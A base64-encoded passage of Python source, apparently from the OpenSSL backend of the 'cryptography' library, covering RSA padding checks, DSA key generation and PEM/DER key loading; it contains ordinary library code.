UEtFWV9YMjU1MTkgaXMgbm90IHByZXNlbnQgaW4gT3BlblNTTCA8IDEuMS4xXHJcbiAgICAgICAgICAgIHJldHVybiBfRWQ0NDhQdWJsaWNLZXkoc2VsZiwgZXZwX3BrZXkpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oIlVuc3VwcG9ydGVkIGtleSB0eXBlLiIpXHJcblxyXG4gICAgZGVmIF9vYWVwX2hhc2hfc3VwcG9ydGVkKHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0pIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIGFsZ29yaXRobSxcclxuICAgICAgICAgICAgKFxyXG4gICAgICAgICAgICAgICAgaGFzaGVzLlNIQTEsXHJcbiAgICAgICAgICAgICAgICBoYXNoZXMuU0hBMjI0LFxyXG4gICAgICAgICAgICAgICAgaGFzaGVzLlNIQTI1NixcclxuICAgICAgICAgICAgICAgIGhhc2hlcy5TSEEzODQsXHJcbiAgICAgICAgICAgICAgICBoYXNoZXMuU0hBNTEyLFxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcnNhX3BhZGRpbmdfc3VwcG9ydGVkKHNlbGYsIHBhZGRpbmc6IEFzeW1tZXRyaWNQYWRkaW5nKSAtPiBib29sOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UocGFkZGluZywgUEtDUzF2MTUpOlxyXG4gICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShwYWRkaW5nLCBQU1MpIGFuZCBpc2luc3RhbmNlKHBhZGRpbmcuX21nZiwgTUdGMSk6XHJcbiAgICAgICAgICAgICMgU0hBMSBpcyBwZXJtaXNzaWJsZSBpbiBNR0YxIGluIEZJUFMgZXZlbiB3aGVuIFNIQTEgaXMgYmxvY2tlZFxyXG4gICAgICAgICAgICAjIGFzIHNpZ25hdHVyZSBhbGdvcml0aG0uXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2ZpcHNfZW5hYmxlZCBhbmQgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgICAgIHBhZGRpbmcuX21nZi5fYWxnb3JpdGhtLCBoYXNoZXMuU0hBMVxyXG4gICAgICAgICAgICApOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBzZWxmLmhhc2hfc3VwcG9ydGVkKHBhZGRpbmcuX21nZi5fYWxnb3JpdGhtKVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShwYWRkaW5nLCBPQUVQKSBhbmQgaXNpbnN0YW5jZShwYWRkaW5nLl9tZ2YsIE1HRjEpOlxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fb2FlcF9oYXNoX3N1cHBvcnRlZChcclxuICAgICAgICAgICAgICAgIHBhZGRpbmcuX21nZi5fYWxnb3JpdGhtXHJcbiAgICAgICAgICAgICkgYW5kIHNlbGYuX29hZXBfaGFzaF9zdXBwb3J0ZWQocGFkZGluZy5fYWxnb3JpdGhtKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgIGRlZiBnZW5lcmF0ZV9kc2FfcGFyYW1ldGVycyhzZWxmLCBrZXlfc2l6ZTogaW50KSAtPiBkc2EuRFNBUGFyYW1ldGVyczpcclxuICAgICAgICBpZiBrZXlfc2l6ZSBub3QgaW4gKDEwMjQsIDIwNDgsIDMwNzIsIDQwOTYpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIktleSBzaXplIG11c3QgYmUgMTAyNCwgMjA0OCwgMzA3Miwgb3IgNDA5NiBiaXRzLiJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBjdHggPSBzZWxmLl9saWIuRFNBX25ldygpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChjdHggIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgY3R4ID0gc2VsZi5fZmZpLmdjKGN0eCwgc2VsZi5fbGliLkRTQV9mcmVlKVxyXG5cclxuICAgICAgICByZXMgPSBzZWxmLl9saWIuRFNBX2dlbmVyYXRlX3BhcmFtZXRlcnNfZXgoXHJcbiAgICAgICAgICAgIGN0eCxcclxuICAgICAgICAgICAga2V5X3NpemUsXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICAwLFxyXG4gICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5OVUxMLFxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9EU0FQYXJhbWV0ZXJzKHNlbGYsIGN0eClcclxuXHJcbiAgICBkZWYgZ2VuZXJhdGVfZHNhX3ByaXZhdGVfa2V5KFxyXG4gICAgICAgIHNlbGYsIHBhcmFtZXRlcnM6IGRzYS5EU0FQYXJhbWV0ZXJzXHJcbiAgICApIC0+IGRzYS5EU0FQcml2YXRlS2V5OlxyXG4gICAgICAgIGN0eCA9IHNlbGYuX2xpYi5EU0FwYXJhbXNfZHVwKFxyXG4gICAgICAgICAgICBwYXJhbWV0ZXJzLl9kc2FfY2RhdGEgICMgdHlwZTogaWdub3JlW2F0dHItZGVmaW5lZF1cclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChjdHggIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgY3R4ID0gc2VsZi5fZmZpLmdjKGN0eCwgc2VsZi5fbGliLkRTQV9mcmVlKVxyXG4gICAgICAgIHNlbGYuX2xpYi5EU0FfZ2VuZXJhdGVfa2V5KGN0eClcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2RzYV9jZGF0YV90b19ldnBfcGtleShjdHgpXHJcblxyXG4gICAgICAgIHJldHVybiBfRFNBUHJpdmF0ZUtleShzZWxmLCBjdHgsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBnZW5lcmF0ZV9kc2FfcHJpdmF0ZV9rZXlfYW5kX3BhcmFtZXRlcnMoXHJcbiAgICAgICAgc2VsZiwga2V5X3NpemU6IGludFxyXG4gICAgKSAtPiBkc2EuRFNBUHJpdmF0ZUtleTpcclxuICAgICAgICBwYXJhbWV0ZXJzID0gc2VsZi5nZW5lcmF0ZV9kc2FfcGFyYW1ldGVycyhrZXlfc2l6ZSlcclxuICAgICAgICByZXR1cm4gc2VsZi5nZW5lcmF0ZV9kc2FfcHJpdmF0ZV9rZXkocGFyYW1ldGVycylcclxuXHJcbiAgICBkZWYgX2RzYV9jZGF0YV9zZXRfdmFsdWVzKHNlbGYsIGRzYV9jZGF0YSwgcCwgcSwgZywgcHViX2tleSwgcHJpdl9rZXkpOlxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5EU0Ffc2V0MF9wcWcoZHNhX2NkYXRhLCBwLCBxLCBnKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkRTQV9zZXQwX2tleShkc2FfY2RhdGEsIHB1Yl9rZXksIHByaXZfa2V5KVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgZGVmIGxvYWRfZHNhX3ByaXZhdGVfbnVtYmVycyhcclxuICAgICAgICBzZWxmLCBudW1iZXJzOiBkc2EuRFNBUHJpdmF0ZU51bWJlcnNcclxuICAgICkgLT4gZHNhLkRTQVByaXZhdGVLZXk6XHJcbiAgICAgICAgZHNhLl9jaGVja19kc2FfcHJpdmF0ZV9udW1iZXJzKG51bWJlcnMpXHJcbiAgICAgICAgcGFyYW1ldGVyX251bWJlcnMgPSBudW1iZXJzLnB1YmxpY19udW1iZXJzLnBhcmFtZXRlcl9udW1iZXJzXHJcblxyXG4gICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2xpYi5EU0FfbmV3KClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGRzYV9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBkc2FfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZHNhX2NkYXRhLCBzZWxmLl9saWIuRFNBX2ZyZWUpXHJcblxyXG4gICAgICAgIHAgPSBzZWxmLl9pbnRfdG9fYm4ocGFyYW1ldGVyX251bWJlcnMucClcclxuICAgICAgICBxID0gc2VsZi5faW50X3RvX2JuKHBhcmFtZXRlcl9udW1iZXJzLnEpXHJcbiAgICAgICAgZyA9IHNlbGYuX2ludF90b19ibihwYXJhbWV0ZXJfbnVtYmVycy5nKVxyXG4gICAgICAgIHB1Yl9rZXkgPSBzZWxmLl9pbnRfdG9fYm4obnVtYmVycy5wdWJsaWNfbnVtYmVycy55KVxyXG4gICAgICAgIHByaXZfa2V5ID0gc2VsZi5faW50X3RvX2JuKG51bWJlcnMueClcclxuICAgICAgICBzZWxmLl9kc2FfY2RhdGFfc2V0X3ZhbHVlcyhkc2FfY2RhdGEsIHAsIHEsIGcsIHB1Yl9rZXksIHByaXZfa2V5KVxyXG5cclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2RzYV9jZGF0YV90b19ldnBfcGtleShkc2FfY2RhdGEpXHJcblxyXG4gICAgICAgIHJldHVybiBfRFNBUHJpdmF0ZUtleShzZWxmLCBkc2FfY2RhdGEsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBsb2FkX2RzYV9wdWJsaWNfbnVtYmVycyhcclxuICAgICAgICBzZWxmLCBudW1iZXJzOiBkc2EuRFNBUHVibGljTnVtYmVyc1xyXG4gICAgKSAtPiBkc2EuRFNBUHVibGljS2V5OlxyXG4gICAgICAgIGRzYS5fY2hlY2tfZHNhX3BhcmFtZXRlcnMobnVtYmVycy5wYXJhbWV0ZXJfbnVtYmVycylcclxuICAgICAgICBkc2FfY2RhdGEgPSBzZWxmLl9saWIuRFNBX25ldygpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChkc2FfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgZHNhX2NkYXRhID0gc2VsZi5fZmZpLmdjKGRzYV9jZGF0YSwgc2VsZi5fbGliLkRTQV9mcmVlKVxyXG5cclxuICAgICAgICBwID0gc2VsZi5faW50X3RvX2JuKG51bWJlcnMucGFyYW1ldGVyX251bWJlcnMucClcclxuICAgICAgICBxID0gc2VsZi5faW50X3RvX2JuKG51bWJlcnMucGFyYW1ldGVyX251bWJlcnMucSlcclxuICAgICAgICBnID0gc2VsZi5faW50X3RvX2JuKG51bWJlcnMucGFyYW1ldGVyX251bWJlcnMuZylcclxuICAgICAgICBwdWJfa2V5ID0gc2VsZi5faW50X3RvX2JuKG51bWJlcnMueSlcclxuICAgICAgICBwcml2X2tleSA9IHNlbGYuX2ZmaS5OVUxMXHJcbiAgICAgICAgc2VsZi5fZHNhX2NkYXRhX3NldF92YWx1ZXMoZHNhX2NkYXRhLCBwLCBxLCBnLCBwdWJfa2V5LCBwcml2X2tleSlcclxuXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9kc2FfY2RhdGFfdG9fZXZwX3BrZXkoZHNhX2NkYXRhKVxyXG5cclxuICAgICAgICByZXR1cm4gX0RTQVB1YmxpY0tleShzZWxmLCBkc2FfY2RhdGEsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBsb2FkX2RzYV9wYXJhbWV0ZXJfbnVtYmVycyhcclxuICAgICAgICBzZWxmLCBudW1iZXJzOiBkc2EuRFNBUGFyYW1ldGVyTnVtYmVyc1xyXG4gICAgKSAtPiBkc2EuRFNBUGFyYW1ldGVyczpcclxuICAgICAgICBkc2EuX2NoZWNrX2RzYV9wYXJhbWV0ZXJzKG51bWJlcnMpXHJcbiAgICAgICAgZHNhX2NkYXRhID0gc2VsZi5fbGliLkRTQV9uZXcoKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoZHNhX2NkYXRhICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGRzYV9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhkc2FfY2RhdGEsIHNlbGYuX2xpYi5EU0FfZnJlZSlcclxuXHJcbiAgICAgICAgcCA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLnApXHJcbiAgICAgICAgcSA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLnEpXHJcbiAgICAgICAgZyA9IHNlbGYuX2ludF90b19ibihudW1iZXJzLmcpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLkRTQV9zZXQwX3BxZyhkc2FfY2RhdGEsIHAsIHEsIGcpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgcmV0dXJuIF9EU0FQYXJhbWV0ZXJzKHNlbGYsIGRzYV9jZGF0YSlcclxuXHJcbiAgICBkZWYgX2RzYV9jZGF0YV90b19ldnBfcGtleShzZWxmLCBkc2FfY2RhdGEpOlxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fY3JlYXRlX2V2cF9wa2V5X2djKClcclxuICAgICAgICByZXMgPSBzZWxmLl9saWIuRVZQX1BLRVlfc2V0MV9EU0EoZXZwX3BrZXksIGRzYV9jZGF0YSlcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHJldHVybiBldnBfcGtleVxyXG5cclxuICAgIGRlZiBkc2Ffc3VwcG9ydGVkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIG5vdCBzZWxmLl9maXBzX2VuYWJsZWRcclxuXHJcbiAgICBkZWYgZHNhX2hhc2hfc3VwcG9ydGVkKHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0pIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IHNlbGYuZHNhX3N1cHBvcnRlZCgpOlxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuICAgICAgICByZXR1cm4gc2VsZi5zaWduYXR1cmVfaGFzaF9zdXBwb3J0ZWQoYWxnb3JpdGhtKVxyXG5cclxuICAgIGRlZiBjbWFjX2FsZ29yaXRobV9zdXBwb3J0ZWQoc2VsZiwgYWxnb3JpdGhtKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLmNpcGhlcl9zdXBwb3J0ZWQoXHJcbiAgICAgICAgICAgIGFsZ29yaXRobSwgQ0JDKGIiXFx4MDAiICogYWxnb3JpdGhtLmJsb2NrX3NpemUpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBjcmVhdGVfY21hY19jdHgoc2VsZiwgYWxnb3JpdGhtOiBCbG9ja0NpcGhlckFsZ29yaXRobSkgLT4gX0NNQUNDb250ZXh0OlxyXG4gICAgICAgIHJldHVybiBfQ01BQ0NvbnRleHQoc2VsZiwgYWxnb3JpdGhtKVxyXG5cclxuICAgIGRlZiBsb2FkX3BlbV9wcml2YXRlX2tleShcclxuICAgICAgICBzZWxmLCBkYXRhOiBieXRlcywgcGFzc3dvcmQ6IHR5cGluZy5PcHRpb25hbFtieXRlc11cclxuICAgICkgLT4gUFJJVkFURV9LRVlfVFlQRVM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2xvYWRfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9saWIuUEVNX3JlYWRfYmlvX1ByaXZhdGVLZXksXHJcbiAgICAgICAgICAgIHNlbGYuX2V2cF9wa2V5X3RvX3ByaXZhdGVfa2V5LFxyXG4gICAgICAgICAgICBkYXRhLFxyXG4gICAgICAgICAgICBwYXNzd29yZCxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGxvYWRfcGVtX3B1YmxpY19rZXkoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IFBVQkxJQ19LRVlfVFlQRVM6XHJcbiAgICAgICAgbWVtX2JpbyA9IHNlbGYuX2J5dGVzX3RvX2JpbyhkYXRhKVxyXG4gICAgICAgICMgSW4gT3BlblNTTCAzLjAueCB0aGUgUEVNX3JlYWRfYmlvX1BVQktFWSBmdW5jdGlvbiB3aWxsIGludm9rZVxyXG4gICAgICAgICMgdGhlIGRlZmF1bHQgcGFzc3dvcmQgY2FsbGJhY2sgaWYgeW91IHBhc3MgYW4gZW5jcnlwdGVkIHByaXZhdGVcclxuICAgICAgICAjIGtleS4gVGhpcyBpcyB2ZXJ5LCB2ZXJ5LCB2ZXJ5IGJhZCBhcyB0aGUgZGVmYXVsdCBjYWxsYmFjayBjYW5cclxuICAgICAgICAjIHRyaWdnZXIgYW4gaW50ZXJhY3RpdmUgY29uc29sZSBwcm9tcHQsIHdoaWNoIHdpbGwgaGFuZyB0aGVcclxuICAgICAgICAjIFB5dGhvbiBwcm9jZXNzLiBXZSB0aGVyZWZvcmUgcHJvdmlkZSBvdXIgb3duIGNhbGxiYWNrIHRvXHJcbiAgICAgICAgIyBjYXRjaCB0aGlzIGFuZCBlcnJvciBvdXQgcHJvcGVybHkuXHJcbiAgICAgICAgdXNlcmRhdGEgPSBzZWxmLl9mZmkubmV3KCJDUllQVE9HUkFQSFlfUEFTU1dPUkRfREFUQSAqIilcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2xpYi5QRU1fcmVhZF9iaW9fUFVCS0VZKFxyXG4gICAgICAgICAgICBtZW1fYmlvLmJpbyxcclxuICAgICAgICAgICAgc2VsZi5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2ZmaS5hZGRyZXNzb2YoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saWIuX29yaWdpbmFsX2xpYiwgIkNyeXB0b2dyYXBoeV9wZW1fcGFzc3dvcmRfY2IiXHJcbiAgICAgICAgICAgICksXHJcbiAgICAgICAgICAgIHVzZXJkYXRhLFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiBldnBfcGtleSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9mZmkuZ2MoZXZwX3BrZXksIHNlbGYuX2xpYi5FVlBfUEtFWV9mcmVlKVxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fZXZwX3BrZXlfdG9fcHVibGljX2tleShldnBfcGtleSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAjIEl0XCdzIG5vdCBhIChSU0EvRFNBL0VDRFNBKSBzdWJqZWN0UHVibGljS2V5SW5mbywgYnV0IHdlIHN0aWxsXHJcbiAgICAgICAgICAgICMgbmVlZCB0byBjaGVjayB0byBzZWUgaWYgaXQgaXMgYSBwdXJlIFBLQ1MxIFJTQSBwdWJsaWMga2V5IChub3RcclxuICAgICAgICAgICAgIyBlbWJlZGRlZCBpbiBhIHN1YmplY3RQdWJsaWNLZXlJbmZvKVxyXG4gICAgICAgICAgICBzZWxmLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgIHJlcyA9IHNlbGYuX2xpYi5CSU9fcmVzZXQobWVtX2Jpby5iaW8pXHJcbiAgICAgICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgICAgIHJzYV9jZGF0YSA9IHNlbGYuX2xpYi5QRU1fcmVhZF9iaW9fUlNBUHVibGljS2V5KFxyXG4gICAgICAgICAgICAgICAgbWVtX2Jpby5iaW8sXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgICAgIHNlbGYuX2ZmaS5hZGRyZXNzb2YoXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fbGliLl9vcmlnaW5hbF9saWIsICJDcnlwdG9ncmFwaHlfcGVtX3Bhc3N3b3JkX2NiIlxyXG4gICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgICAgIHVzZXJkYXRhLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIHJzYV9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgICAgIHJzYV9jZGF0YSA9IHNlbGYuX2ZmaS5nYyhyc2FfY2RhdGEsIHNlbGYuX2xpYi5SU0FfZnJlZSlcclxuICAgICAgICAgICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fcnNhX2NkYXRhX3RvX2V2cF9wa2V5KHJzYV9jZGF0YSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBfUlNBUHVibGljS2V5KHNlbGYsIHJzYV9jZGF0YSwgZXZwX3BrZXkpXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9oYW5kbGVfa2V5X2xvYWRpbmdfZXJyb3IoKVxyXG5cclxuICAgIGRlZiBsb2FkX3BlbV9wYXJhbWV0ZXJzKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBkaC5ESFBhcmFtZXRlcnM6XHJcbiAgICAgICAgbWVtX2JpbyA9IHNlbGYuX2J5dGVzX3RvX2JpbyhkYXRhKVxyXG4gICAgICAgICMgb25seSBESCBpcyBzdXBwb3J0ZWQgY3VycmVudGx5XHJcbiAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9saWIuUEVNX3JlYWRfYmlvX0RIcGFyYW1zKFxyXG4gICAgICAgICAgICBtZW1fYmlvLmJpbywgc2VsZi5fZmZpLk5VTEwsIHNlbGYuX2ZmaS5OVUxMLCBzZWxmLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiBkaF9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZGhfY2RhdGEsIHNlbGYuX2xpYi5ESF9mcmVlKVxyXG4gICAgICAgICAgICByZXR1cm4gX0RIUGFyYW1ldGVycyhzZWxmLCBkaF9jZGF0YSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLl9oYW5kbGVfa2V5X2xvYWRpbmdfZXJyb3IoKVxyXG5cclxuICAgIGRlZiBsb2FkX2Rlcl9wcml2YXRlX2tleShcclxuICAgICAgICBzZWxmLCBkYXRhOiBieXRlcywgcGFzc3dvcmQ6IHR5cGluZy5PcHRpb25hbFtieXRlc11cclxuICAgICkgLT4gUFJJVkFURV9LRVlfVFlQRVM6XHJcbiAgICAgICAgIyBPcGVuU1NMIGhhcyBhIGZ1bmN0aW9uIGNhbGxlZCBkMmlfQXV0b1ByaXZhdGVLZXkgdGhhdCBpbiB0aGVvcnlcclxuICAgICAgICAjIGhhbmRsZXMgdGhpcyBhdXRvbWF0aWNhbGx5LCBob3dldmVyIGl0IGRvZXNuXCd0IGhhbmRsZSBlbmNyeXB0ZWRcclxuICAgICAgICAjIHByaXZhdGUga2V5cy4gSW5zdGVhZCB3ZSB0cnkgdG8gbG9hZCB0aGUga2V5IHR3byBkaWZmZXJlbnQgd2F5cy5cclxuICAgICAgICAjIEZpcnN0IHdlXCdsbCB0cnkgdG8gbG9hZCBpdCBhcyBhIHRyYWRpdGlvbmFsIGtleS5cclxuICAgICAgICBiaW9fZGF0YSA9IHNlbGYuX2J5dGVzX3RvX2JpbyhkYXRhKVxyXG4gICAgICAgIGtleSA9IHNlbGYuX2V2cF9wa2V5X2Zyb21fZGVyX3RyYWRpdGlvbmFsX2tleShiaW9fZGF0YSwgcGFzc3dvcmQpXHJcbiAgICAgICAgaWYga2V5OlxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fZXZwX3BrZXlfdG9fcHJpdmF0ZV9rZXkoa2V5KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICMgRmluYWxseSB3ZSB0cnkgdG8gbG9hZCBpdCB3aXRoIHRoZSBtZXRob2QgdGhhdCBoYW5kbGVzIGVuY3J5cHRlZFxyXG4gICAgICAgICAgICAjIFBLQ1M4IHByb3Blcmx5LlxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fbG9hZF9rZXkoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saWIuZDJpX1BLQ1M4UHJpdmF0ZUtleV9iaW8sXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9ldnBfcGtleV90b19wcml2YXRlX2tleSxcclxuICAgICAgICAgICAgICAgIGRhdGEsXHJcbiAgICAgICAgICAgICAgICBwYXNzd29yZCxcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfZXZwX3BrZXlfZnJvbV9kZXJfdHJhZGl0aW9uYWxfa2V5KHNlbGYsIGJpb19kYXRhLCBwYXNzd29yZCk6XHJcbiAgICAgICAga2V5ID0gc2VsZi5fbGliLmQyaV9Qcml2YXRlS2V5X2JpbyhiaW9fZGF0YS5iaW8sIHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGlmIGtleSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgIyBJbiBPcGVuU1NMIDMuMC4wLWFscGhhMTUgdGhlcmUgZXhpc3Qgc2NlbmFyaW9zIHdoZXJlIHRoZSBrZXkgd2lsbFxyXG4gICAgICAgICAgICAjIHN1Y2Nlc3NmdWxseSBsb2FkIGJ1dCBlcnJvcnMgYXJlIHN0aWxsIHB1dCBvbiB0aGUgc3RhY2suIFRyYWNrZWRcclxuICAgICAgICAgICAgIyBhcyBodHRwczovL2dpdGh1Yi5jb20vb3BlbnNzbC9vcGVuc3NsL2lzc3Vlcy8xNDk5NlxyXG4gICAgICAgICAgICBzZWxmLl9jb25zdW1lX2Vycm9ycygpXHJcblxyXG4gICAgICAgICAgICBrZXkgPSBzZWxmLl9mZmkuZ2Moa2V5LCBzZWxmLl9saWIuRVZQX1BLRVlfZnJlZSlcclxuICAgICAgICAgICAgaWYgcGFzc3dvcmQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIlBhc3N3b3JkIHdhcyBnaXZlbiBidXQgcHJpdmF0ZSBrZXkgaXMgbm90IGVuY3J5cHRlZC4iXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICByZXR1cm4ga2V5XHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgIGRlZiBsb2FkX2Rlcl9wdWJsaWNfa2V5KHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBQVUJMSUNfS0VZX1RZUEVTOlxyXG4gICAgICAgIG1lbV9iaW8gPSBzZWxmLl9ieXRlc190b19iaW8oZGF0YSlcclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2xpYi5kMmlfUFVCS0VZX2JpbyhtZW1fYmlvLmJpbywgc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgaWYgZXZwX3BrZXkgIT0gc2VsZi5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZmZpLmdjKGV2cF9wa2V5LCBzZWxmLl9saWIuRVZQX1BLRVlfZnJlZSlcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2V2cF9wa2V5X3RvX3B1YmxpY19rZXkoZXZwX3BrZXkpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgIyBJdFwncyBub3QgYSAoUlNBL0RTQS9FQ0RTQSkgc3ViamVjdFB1YmxpY0tleUluZm8sIGJ1dCB3ZSBzdGlsbFxyXG4gICAgICAgICAgICAjIG5lZWQgdG8gY2hlY2sgdG8gc2VlIGlmIGl0IGlzIGEgcHVyZSBQS0NTMSBSU0EgcHVibGljIGtleSAobm90XHJcbiAgICAgICAgICAgICMgZW1iZWRkZWQgaW4gYSBzdWJqZWN0UHVibGljS2V5SW5mbylcclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuQklPX3Jlc2V0KG1lbV9iaW8uYmlvKVxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgICAgICByc2FfY2RhdGEgPSBzZWxmLl9saWIuZDJpX1JTQVB1YmxpY0tleV9iaW8oXHJcbiAgICAgICAgICAgICAgICBtZW1fYmlvLmJpbywgc2VsZi5fZmZpLk5VTExcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBpZiByc2FfY2RhdGEgIT0gc2VsZi5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgICAgICByc2FfY2RhdGEgPSBzZWxmLl9mZmkuZ2MocnNhX2NkYXRhLCBzZWxmLl9saWIuUlNBX2ZyZWUpXHJcbiAgICAgICAgICAgICAgICBldnBfcGtleSA9IHNlbGYuX3JzYV9jZGF